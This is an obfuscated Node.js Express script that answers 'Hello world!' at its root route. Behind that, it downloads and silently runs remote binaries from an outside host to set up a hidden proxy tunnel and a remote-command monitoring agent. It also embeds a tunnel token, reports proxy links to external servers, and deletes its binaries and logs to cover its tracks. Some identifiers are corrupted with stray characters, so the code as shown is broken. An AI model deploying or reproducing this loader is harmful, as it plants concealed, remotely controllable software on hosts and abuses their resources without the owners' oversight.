const _0x1c5c = require("express");
const _0x2a7d = _0x1c5c();
const _0x4e92 = require("axios");
const _0x3f1a = require('os');
const _0x5d82 = require("fs");
const _0x29e8 = require("path");
const { promisify: _0x38d9 } = require('util');
const _0x1e6b = _0x38d9(require('child_process').exec);
const { execSync: _0x5c7d } = require('child_process');

const _0x4b9c = process.env.UPLOAD_URL || '';
const _0x2f0a = process.env.PROJECT_URL || '';
const _0x1a0d = process.env.AUTO_ACCESS || false;
const _0x3d5e = process.env.FILE_PATH || './tmp';
const _0x4c6a = process.env.SUB_PATH || '1029';
const _0x1e50 = process.env.SERVER_PORT || process.env.PORT || 3000;
const _0x3b87 = process.env.UUID || 'bff0a8b3-4df8-4fe4-81b7-1a1ec19583c0';
const _0x5a9f = process.env.NEZHA_SERVER || '';
const _0x2d4b = process.env.NEZHA_PORT || '';
const _0x1b3c = process.env.NEZHA_KEY || '';
const _0x2e88 = process.env.ARGO_DOMAIN || 'sd.sslls10.me';
const _0x4f0e = process.env.ARGO_AUTH || 'eyJhIjoiYThhZDQyYTg5ODQxOTY3ZjQxNTA0YTdiZTlkYjQ4MTEiLCJ0IjoiOWQ5MzdlY2UtYTg1ZS00MjhmLWEyNmYtMzAwNGVmY2M0NmNhIiwicyI6Ik9UUXpPR1ZqT0dJdE9UTTRPQzAwWXpreExXSmhaR1F0WkdVek1URXhNRFkyT0RReiJ9';
const _0x3c8d = process.env.ARGO_PORT || 8001;
const _0x5e3a = process.env.CFIP || 'cdns.doon.eu.org';
const _0x2b66 = process.env.CFPORT || 443;
const _0x1d9f = process.env.NAME || 'sd';

if (!_0x5d82.existsSync(_0x3d5e)) {
    _0x5d82.mkdirSync(_0x3d5e);
    console.log(`${_0x3d5e} is created`);
} else {
    console.log(`${_0x3d5e} already exists`);
}

function _0x2cdf() {
    const _0x5b1a = 'abcdefghijklmnopqrstuvwxyz';
    let _0x3a7e = '';
    for (let _0x5870 = 0; _0x5870 < 6; _0x5870++) {
        _0x3a7e += _0x5b1a.charAt(Math.floor(Math.random() * _0x5b1a.length));
    }
    return _0x3a7e;
}

const _0x4f9b = _0x2cdf();
const _0x3e4d = _0x2cdf();
const _0x1c0a = _0x2cdf();
const _0x5b0c = _0x2cdf();
let _0x1f92 = _0x29e8.join(_0x3d5e, _0x4f9b);
let _0x2e7b = _0x29e8.join(_0x3d5e, _0x5b0c);
let _0x3fd8 = _0x29e8.join(_0x3d5e, _0x3e4d);
let _0x4d31 = _0x29e8.join(_0x3d5e, _0x1c0a);
let _0x2a0e = _0x29e8.join(_0x3d5e, 'sub.txt');
let _0x1d6c = _0x29e8.join(_0x3d5e, 'list.txt');
let _0x4a1e = _0x29e8.join(_0x3d5e, 'boot.log');
let _0x1b6d = _0x29e8.join(_0x3d5e, 'config.json');

function _0x3f89() {
    try {
        if (!_0x4b9c) return;
        if (!_0x5d82.existsSync(_0x2a0e)) return;

        let _0x5c1d;
        try {
            _0x5c1d = _0x5d82.readFileSync(_0x2a0e, 'utf-8');
        } catch {
            return null;
        }

        const _0x4e0a = Buffer.from(_0x5c1d, 'base64').toString('utf-8');
        const _0x5d9e = _0x4e0a.split('\n').filter(_0x2a4d => 
            /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(_0x2a4d)
        );

        if (_0x5d9e.length === 0) return;

        _0x4e92.post(`${_0x4b9c}/api/delete-nodes`, 
            JSON.stringify({ nodes: _0x5d9e }),
            { headers: { 'Content-Type': 'application/json' } }
        ).catch((_0x3f5a) => { 
            return null; 
        });
        return null;
    } catch (_0x4d7b) {
        return null;
    }
}

function _0x2b35() {
    try {
        const _0x1a8c = _0x5d82.readdirSync(_0x3d5e);
        _0x1a8c.forEach(_0x2f9b => {
            const _0x5a7d = _0x29e8.join(_0x3d5e, _0x2f9b);
            try {
                const _0x4c3d = _0x5d82.statSync(_0x5a7d);
                if (_0x4c3d.isFile()) {
                    _0x5d82.unlinkSync(_0x5a7d);
                }
            } catch (_0x2d4f) {
            }
        });
    } catch (_0x1e3c) {
    }
}

_0x2a7d.get("/", function(_0x3e1d, _0x5d9c) {
    _0x5d9c.send("Hello world!");
});

async function _0x3a6b() {
    const _0x5a0c = {
        log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
        inbounds: [
            { port: _0x3c8d, protocol: 'vless', settings: { clients: [{ id: _0x3b87, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
            { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: _0x3b87 }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
            { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: _0x3b87, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: _0x3b87, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: _0x3b87 }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
        ],
        dns: { servers: ["https+local://8.8.8.8/dns-query"] },
        outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
    };
    _0x5d82.writeFileSync(_0x29e8.join(_0x3d5e, 'config.json'), JSON.stringify(_0x5a0c, null, 2));
}

function _0x5e60() {
    const _0x4d9c = _0x3f1a.arch();
    if (_0x4d9c === 'arm' || _0x4d9c === 'arm64' || _0x4d9c === 'aarch64') {
        return 'arm';
    } else {
        return 'amd';
    }
}

function _0x2f5e(_0x1f6b, _0x3a4b, _0x4b5d) {
    const _0x5c4c = _0x1f6b; 
    
    if (!_0x5d82.existsSync(_0x3d5e)) {
        _0x5d82.mkdirSync(_0x3d5e, { recursive: true });
    }
    
    const _0x2b16 = _0x5d82.createWriteStream(_0x5c4c);

    _0x4e92({
        method: 'get',
        url: _0x3a4b,
        responseType: 'stream',
    })
        .then(_0x1b3d => {
            _0x1b3d.data.pipe(_0x2b16);

            _0x2b16.on('finish', () => {
                _0x2b16.close();
                console.log(`Download ${_0x29e8.basename(_0x5c4c)} successfully`);
                _0x4b5d(null, _0x5c4c);
            });

            _0x2b16.on('error', _0x2e4f => {
                _0x5d82.unlink(_0x5c4c, () => { });
                const _0x3a3e = `Download ${_0x29e8.basename(_0x5c4c)} failed: ${_0x2e4f.message}`;
                console.error(_0x3a3e);
                _0x4b5d(_0x3a3e);
            });
        })
        .catch(_0x4d3f => {
            const _0x1c2f = `Download ${_0x29e8.basename(_0x5c4c)} failed: ${_0x4d3f.message}`;
            console.error(_0x1c2f);
            _0x4b5d(_0x1c2f);
        });
}

async function _0x3b8f() {  
    
    const _0x4a6c = _0x5e60();
    const _0x4d65 = _0x1f76(_0x4a6c);

    if (_0x4d65.length === 0) {
        console.log(`Can't find a file for the current architecture`);
        return;
    }

    const _0x3b1a = _0x4d65.map(_0x5a6c => {
        return new Promise((_0x4e6c, _0x5d1d) => {
            _0x2f5e(_0x5a6c.fileName, _0x5a6c.fileUrl, (_0x2f08, _0x1a1f) => {
                if (_0x2f08) {
                    _0x5d1d(_0x2f08);
                } else {
                    _0x4e6c(_0x1a1f);
                }
            });
        });
    });

    try {
        await Promise.all(_0x3b1a);
    } catch (_0x1b3b) {
        console.error('Error downloading files:', _0x1b3b);
        return;
    }
    
    function _0x1d9d(_0x5c55) {
        const _0x1c4a = 0o775;
        _0x5c55.forEach(_0x3b6d => {
            if (_0x5d82.existsSync(_0x3b6d)) {
                _0x5d82.chmod(_0x3b6d, _0x1c4a, (_0x3b4f) => {
                    if (_0x3b4f) {
                        console.error(`Empowerment failed for ${_0x3b6d}: ${_0x3b4f}`);
                    } else {
                        console.log(`Empowerment success for ${_0x3b6d}: ${_0x1c4a.toString(8)}`);
                    }
                });
            }
        });
    }
    const _0x2e7f = _0x2d4b ? [_0x1f92, _0x3fd8, _0x4d31] : [_0x2e7b, _0x3fd8, _0x4d31];
    _0x1d9d(_0x2e7f);

    if (_0x5a9f && _0x1b3c) {
        if (!_0x2d4b) {
            const _0x4b8f = _0x5a9f.includes(':') ? _0x5a9f.split(':').pop() : '';
            const _0x5a2e = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
            const _0x5a0a = _0x5a2e.has(_0x4b8f) ? 'true' : 'false';
            const _0x1c6b = `
client_secret: ${_0x1b3c}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${_0x5a9f}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${_0x5a0a}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${_0x3b87}`;
            
            _0x5d82.writeFileSync(_0x29e8.join(_极速3d5e, 'config.yaml'), _0x1c6b);
            
            const _0x2a1a = `nohup ${_0x2e7b} -c "${_0x3d5e}/config.yaml" >/dev/null 2>&1 &`;
            try {
                await _0x1e6b(_0x2a1a);
                console.log(`${_0x5b0c} is running`);
                await new Promise((_0x1f8d) => setTimeout(_0x1f8d, 1000));
            } catch (_0x4d3a) {
                console.error(`php running error: ${_0x4d3a}`);
            }
        } else {
            let _0x2e1b = '';
            const _0x5a90 = ['443', '8443', '2096', '2087', '2083', '2053'];
            if (_0x5a90.includes(_0x2d4b)) {
                _0x2e1b = '--tls';
            }
            const _0x1c9e = `nohup ${_0x1f92} -s ${_0x5a9f}:${_0x2d4b} -p ${_0x1b3c} ${_0x2e1b} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
            try {
                await _0x1e6b(_0x1c9e);
                console.log(`${_0x4f9b} is running`);
                await new Promise((_0x3f0b) => setTimeout(_0x3f0b, 1000));
            } catch (_0x5d4e) {
                console.error(`npm running error: ${_0x5d极速4e}`);
            }
        }
    } else {
        console.log('NEZHA variable is empty,skip running');
    }
    
    const _0x5a59 = `nohup ${_0x3fd8} -c ${_0x3d5e}/config.json >/dev/null 2>&1 &`;
    try {
        await _0x1e6b(_0x5a59);
        console.log(`${_0x3e4d} is running`);
        await new Promise((_0x1d8a) => setTimeout(_0x1d8a, 1000));
    } catch (_0x2f6c) {
        console.error(`web running error: ${_0x2f6c}`);
    }

    if (_0x5d82.existsSync(_0x4d31)) {
        let _0x5d3b;

        if (_0x4f0e.match(/^[A-Z0-9a-z=]{120,250}$/)) {
            _0x5d3b = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${_0x4f0e}`;
        } else if (_0x4f0e.match(/TunnelSecret/)) {
            _0x5d3b = `tunnel --edge-ip-version auto --config ${_0x3d5e}/tunnel.yml run`;
        } else {
            _0x5d3b = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${_0x3d5e}/boot.log --loglevel info --url http://localhost:${_0x3c8d}`;
        }

        try {
            await _0x1e6b(`nohup ${_0x4d31} ${_0x5d3b} >/dev/null 2>&1 &`);
            console.log(`${_0x1c0a} is running`);
            await new Promise((_0x1c48) => setTimeout(_0x1c48, 2000));
        } catch (_0x4a8b) {
            console.error(`Error executing command: ${_0x4a8b}`);
        }
    }
    await new Promise((_0x5b1d) => setTimeout(_0x5b1d, 5000));

}

function _0x1f76(_0x3d6c) {
    let _0x5b7e;
    if (_0x3d6c === 'arm') {
        _0x5b7e = [
            { fileName: _0x3fd8, fileUrl: "https://arm64.ssss.nyc.mn/web" },
            { fileName: _0x4d31, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
        ];
    } else {
        _0x5b7e = [
            { fileName: _0x3fd8, fileUrl: "https://amd64.ssss.nyc.mn/web" },
            { fileName: _0x4d31, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
        ];
    }

    if (_0x5a9f && _0x1b3c) {
        if (_0x2d4b) {
            const _0x1a3a = _0x3d6c === 'arm' 
                ? "https://arm64.ssss.nyc.mn/agent"
                : "https://amd64.ssss.nyc.mn/agent";
                _0x5b7e.unshift({ 
                    fileName: _0x1f92, 
                    fileUrl: _0x1a3a 
                });
        } else {
            const _0x3d7f = _0x3d6c === 'arm' 
                ? "https://arm64.ssss.nyc.mn/v1" 
                : "https://amd64.ssss.nyc.mn/v1";
            _0x5b7e.unshift({ 
                fileName: _0x2e7b, 
                fileUrl: _0x3d7f
            });
        }
    }

    return _0x5b7e;
}

function _0x3e6d() {
    if (!_0x4f0e || !_0x2e88) {
        console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
        return;
    }

    if (_0x4f0e.includes('TunnelSecret')) {
        _0x5d82.writeFileSync(_0x29e8.join(_0x3d5e, 'tunnel.json'), _0x4f0e);
        const _0x5d9d = `
  tunnel: ${_0x4f0e.split('"')[11]}
  credentials-file: ${_0x29e8.join(_0x3d5e, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${_0x2e88}
      service: http://localhost:${_0x3c8d}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
        _0x5d82.writeFileSync(_0x29e8.join(_0x3d5e, 'tunnel.yml'), _0x5d9d);
    } else {
        console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
    }
}
_0x3e6d();

async function _0x2e5d() {
    let _0x5b5e;

    if (_0x4f0e && _0x2e88) {
        _0x5b5极速 = _0x2e88;
        console.log('ARGO_DOMAIN:', _0x5b5e);
        await _0x2b0a(_0x5b5e);
    } else {
        try {
            const _0x1b2d = _0x5d82.readFileSync(_0x29e8.join(_0x3d5e, 'boot.log'), 'utf-8');
            const _0x1a69 = _0x1b2d.split('\n');
            const _0x4f3b = [];
            _0x1a69.forEach((_0x5a0d) => {
                const _0x2b5f = _0x5a0d.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x2b5f) {
                    const _0x5d6a = _0x2b5f[1];
                    _0x4f3b.push(_0x5d6a);
                }
            });

            if (_0x4f3b.length > 0) {
                _0x5b5e = _0x4f3b[0];
                console.log('ArgoDomain:', _0x5b5e);
                await _0x2b0a(_0x5b5e);
            } else {
                console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
                _0x5d82.unlinkSync(_0x29e8.join(_0x3d5e, 'boot.log'));
                async function _0x2f8d() {
                    try {
                        if (process.platform === 'win32') {
                            await _0x1e6b(`taskkill /f /im ${_0x1c0a}.exe > nul 2>&1`);
                        } else {
                            await _0x1e6b(`pkill -f "[${_0x1c0a.charAt(0)}]${_0x1c0a.substring(1)}" > /dev/null 2>&1`);
                        }
                    } catch (_0x2e58) {
                    }
                }
                _0x2f8d();
                await new Promise((_0x1a19) => setTimeout(_0x1a19, 3000));
                const _0x1c7a = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${_0x3d5e}/boot.log --loglevel info --url http://localhost:${_0x3c8d}`;
                try {
                    await _0x1e6b(`nohup ${_0x4d31} ${_0x1c7a} >/dev/null 2>&1 &`);
                    console.log(`${_0x1c0a} is running`);
                    await new Promise((_0x3f8f) => setTimeout(_0x3f8f, 3000));
                    await _0x2e5d();
                } catch (_0x1d4f) {
                    console.error(`Error executing command: ${_0x1d4f}`);
                }
            }
        } catch (_0x1c65) {
            console.error('Error reading boot.log:', _0x1c65);
        }
    }

    async function _0x2b0a(_0x4d9e) {
        const _0x1b7c = _0x5c7d(
            'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
            { encoding: 'utf-8' }
        );
        const _0x5d1c = _0x1b7c.trim();
        const _0x2a8c = _0x1d9f ? `${_0x1d9f}-${_0x5d1c}` : _0x5d1c;

        return new Promise((_0x4a49) => {
            setTimeout(() => {
                const _0x4b5f = { v: '2', ps: `${_0x2a8c}`, add: _0x5e3a, port: _0x2b66, id: _0x3b87, aid: '0', scy: 'none', net: 'ws', type: 'none', host: _0x4d9e, path: '/vmess-argo?ed=2560', tls: 'tls', sni: _0x4d9e, alpn: '', fp: 'firefox'};
                const _0x3f2c = `
vless://${_0x3b87}@${_0x5e3a}:${_0x2b66}?encryption=none&security=tls&sni=${_0x4d9e}&fp=firefox&type=ws&host=${_0x4d9e}&path=%2Fvless-argo%3Fed%3D2560#${_0x2a8c}
  
vmess://${Buffer.from(JSON.stringify(_0x4b5f)).toString('base64')}
  
trojan://${_0x3b87}@${_0x5e3a}:${_0x2b66}?security=tls&sni=${_0x4d9e}&fp=firefox&type=ws&host=${_0x4d9e}&path=%2Ftrojan-argo%3Fed%3D2560#${_0x2a8c}
    `;
                console.log(Buffer.from(_0x3f2c).toString('base64'));
                _0x5d82.writeFileSync(_0x2a0e, Buffer.from(_0x3f2c).toString('base64'));
                console.log(`${_0x3d5e}/sub.txt saved successfully`);
                _0x4a1d();
                _0x2a7d.get(`/${_0x4c6a}`, (_0x4a0d, _0x2e1a) => {
                    const _0x5a6d = Buffer.from(_0x3f2c).toString('base64');
                    _0x2e1a.set('Content-Type', 'text/plain; charset=utf-8');
                    _0x2e1a.send(_0x5a6d);
                });
                _0x4a49(_0x3f2c);
            }, 2000);
        });
    }
}

async function _0x4a1d() {
    if (_0x4b9c && _0x2f0a) {
        const _0x1d61 = `${_0x2f0a}/${_0x4c6a}`;
        const _0x2b4d = {
            subscription: [_0x1d61]
        };
        try {
            const _0x1a62 = await _0x4e92.post(`${_0x4b9c}/api/add-subscriptions`, _0x2b4d, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            if (_0x1a62 && _0x1a62.status === 200) {
                console.log('Subscription uploaded successfully');
                return _0x1a62;
            } else {
                return null;
            }
        } catch (_0x4a4c) {
            if (_0x4a4c.response) {
                if (_0x4a4c.response.status === 400) {
                }
            }
        }
    } else if (_0x4b9c) {
        if (!_0x5d82.existsSync(_0x1d6c)) return;
        const _0x2b4b = _0x5d82.readFileSync(_0x1d6c, 'utf-8');
        const _0x1c0c = _0x2b4b.split('\n').filter(_0x5d0d => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(_0x5d0d));

        if (_0x1c0c.length === 0) return;

        const _0x5b78 = JSON.stringify({ nodes: _0x1c0c });

        try {
            const _0x5d4c = await _0x4e92.post(`${_0x4b9c}/api/add-nodes`, _0x5b78, {
                headers: { 'Content-Type': 'application/json' }
            });
            if (_0x5d4c && _0x5d4c.status === 200) {
                console.log('Nodes uploaded successfully');
                return _0x5d4c;
            } else {
                return null;
            }
        } catch (_0x2b4a) {
            return null;
        }
    } else {
        return;
    }
}

function _0x1b2b() {
    setTimeout(() => {
        const _0x5a3b = [_0x4a1e, _0x1b6d, _0x3fd8, _0x4d31];  
        
        if (_0x2d4b) {
            _0x5a3b.push(_0x1f92);
        } else if (_0x5a9f && _0x1b3c) {
            _0x5a3b.push(_0x2e7b);
        }

        if (process.platform === 'win32') {
            _0x1e6b(`del /f /q ${_0x5a3b.join(' ')} > nul 2>&1`, (_0x3e9e) => {
                console.clear();
                console.log('App is running');
                console.log('Thank you for using this script, enjoy!');
            });
        } else {
            _0x1e6b(`rm -rf ${_0x5a3b.join(' ')} >/dev/null 2>&1`, (_0x4b3e) => {
                console.clear();
                console.log('App is running');
                console.log('Thank you for using this script, enjoy!');
            });
        }
    }, 90000);
}
_0x1b2b();

async function _0x3b0d() {
    if (!_0x1a0d || !_0x2f0a) {
        console.log("Skipping adding automatic access task");
        return;
    }

    try {
        const _0x5b8d = await _0x4e92.post('https://oooo.serv00.net/add-url', {
            url: _0x2f0a
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        console.log(`automatic access task added successfully`);
        return _0x5b8d;
    } catch (_0x4d6c) {
        console.error(`Add automatic access task faild: ${_0x4d6c.message}`);
        return null;
    }
}

async function _0x1f5d() {
    try {
        _0x3f89();
        _0x2b35();
        await _0x3a6b();
        await _0x3b8f();
        await _0x2e5d();
        await _0x3b0d();
    } catch (_0x1d7a) {
        console.error('Error in startserver:', _0x1d7a);
    }
}
_0x1f5d().catch(_0x3a3f => {
    console.error('Unhandled error in startserver:', _0x3a3f);
});

_0x2a7d.listen(_0x1e50, () => console.log(`http server is running on port:${_0x1e50}!`));
